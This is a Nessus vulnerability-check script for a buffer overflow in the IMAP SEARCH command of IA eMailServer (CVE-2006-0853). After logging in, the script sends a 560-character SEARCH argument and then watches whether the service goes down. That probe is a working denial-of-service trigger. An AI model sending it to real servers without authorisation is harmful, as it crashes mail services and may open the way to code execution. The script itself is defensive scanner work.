#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote IMAP server is susceptible to buffer overflow attacks. 

Description :

The remote host is running IA eMailServer, a commercial messaging
system for Windows. 

The IMAP server bundled with the version of IA eMailServer installed
on the remote host crashes when it receives a SEARCH command argument
of 560 or more characters.  An authenticated attacker could exploit
this issue to crash the service and possibly to execute arbitrary code
remotely. 

Note that IA eMailServer can be configured to run as a service with
LOCAL SYSTEM privileges, although this is not the default. 

See also : 

http://www.securityfocus.com/archive/1/425586/30/0/threaded

Solution :

Unknown at this time.

Risk factor :

Medium / CVSS Base Score : 4.1
(AV:R/AC:L/Au:R/C:P/I:P/A:P/B:N)";


if (description) {
  script_id(20960);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2006-0853");
  script_bugtraq_id(16744);
  if (defined_func("script_xref")) {
    script_xref(name:"OSVDB", value:"23377");
  }

  script_name(english:"IA eMailServer IMAP Server Search Command Buffer Overflow Vulnerability");
  script_summary(english:"Checks for search command buffer overflow vulnerability in IA eMailServer's IMAP server");

  script_description(english:desc);
 
  script_category(ACT_DENIAL);
  script_family(english:"Gain root remotely");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("find_service.nes", "imap_overflow.nasl");
  script_require_keys("imap/login", "imap/password");
  script_exclude_keys("imap/false_imap", "imap/overflow");
  script_require_ports("Services/imap", 143);

  exit(0);
}


include("global_settings.inc");


port = get_kb_item("Services/imap");
if (!port) port = 143;
if (!get_port_state(port) || get_kb_item("imap/false_imap")) exit(0);


user = get_kb_item("imap/login");
pass = get_kb_item("imap/password");
if (!user || !pass) exit(0);


# Establish a connection.
tag = 0;
soc = open_sock_tcp(port);
if (!soc) exit(0);


# Read banner and make sure it looks like IA eMailServer.
s = recv_line(socket:soc, length:1024);
if (
  !strlen(s) || 
  "* OK True North Software IMAP4rev1 Server" >!< s
) {
  close(soc);
  exit(0);
}


# Try to log in.
++tag;
resp = NULL;
c = string("nessus", string(tag), " LOGIN ", user, " ", pass);
send(socket:soc, data:string(c, "\r\n"));
while (s = recv_line(socket:soc, length:1024)) {
  s = chomp(s);
  m = eregmatch(pattern:string("^nessus", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
  if (!isnull(m)) {
    resp = m[1];
    break;
  }
}


# If successful, select the INBOX.
if (resp && resp =~ "OK") {
  ++tag;
  resp = NULL;
  c = string("nessus", string(tag), " SELECT inbox");
  send(socket:soc, data:string(c, "\r\n"));
  while (s = recv_line(socket:soc, length:1024)) {
    s = chomp(s);
    m = eregmatch(pattern:string("^nessus", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
    if (!isnull(m)) {
      resp = m[1];
      break;
    }
  }

  # If successful, try to exploit the flaw to crash the server.
  if (resp && resp =~ "OK") {
    ++tag;
    resp = NULL;
    c = string("nessus", string(tag), " SEARCH ", crap(560));
    send(socket:soc, data:string(c, "\r\n"));
    while (s = recv_line(socket:soc, length:1024)) {
      s = chomp(s);
      m = eregmatch(pattern:string("^nessus", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
      if (!isnull(m)) {
        resp = m[1];
        break;
      }
    }

    # If it looks like it might be vulnerable...
    if ("SEARCH command has unrecognized key" >< s) {
      # nb: the server doesn't crash right away.
      tries = 5;
      for (iter=1; iter <= tries; iter++) {
        sleep(5);
        soc2 = open_sock_tcp(port);
        if (soc2) s2 = recv_line(socket:soc, length:2048);

        # Consider it a problem if we get two consecutive failures 
        # to establish a connection or read the banner.
        if (soc2 && strlen(s2)) {
          if (failed) break;
        }
        else failed++;

        if (failed > 1) {
          security_warning(port);
          exit(0);
        }
        close(soc2);
      }
    }
  }
}
else if (resp =~ "BAD" || resp =~ "NO") {
  #if (log_verbosity > 1) debug_print("couldn't login with supplied imap credentials!", level:0);
}


# Logout.
++tag;
resp = NULL;
c = string("nessus", string(tag), " LOGOUT");
send(socket:soc, data:string(c, "\r\n"));
while (s = recv_line(socket:soc, length:1024)) {
  s = chomp(s);
  m = eregmatch(pattern:string("^nessus", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
  if (!isnull(m)) {
    resp = m[1];
    break;
  }
}
close(soc);
